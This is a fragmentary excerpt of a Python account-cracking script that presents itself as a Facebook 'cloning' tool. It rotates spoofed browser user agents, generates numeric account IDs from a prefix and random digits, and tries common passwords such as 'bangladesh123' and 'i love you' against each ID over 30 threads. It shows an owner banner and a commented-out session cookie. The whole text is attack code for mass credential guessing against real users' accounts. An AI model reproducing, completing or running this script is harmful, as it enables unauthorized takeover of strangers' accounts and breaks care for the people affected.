...
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Cent"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile"}
...
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Cent"}
...
def random_pak_number():
    ...
    limit = int(input('\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92mEXAMPLE: 20000, 50000, 100000, 400000\n\n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;93mCHOOSE CLONING LIMIT :\033[1;32m '))
    ...
    with ThreadPool(max_workers=30) as yaari:
	    ...
	    print(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mSENAYEL ISLAM DIP')
	    ...
	    for guru in user:
		    uid = kode+guru
		    pwx = [guru, 'bangladesh','Bangladesh','i love you','I Love You','bangladesh123','free fire','freefire123',]
...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
   		 ...
   		 # 'cookie': 'datr=xN7GY8W6AfaGV_Q9fgobk0cj; sb=xN7GY5gN3Y1v8Jg8IAYeGpp7; wd=461x834; fr=0vQ0w0rGrrIW3KKeh..BjxuGI.hN.AAA.0.0.Bj0OpQ.AWU_ZHxxe1Y',
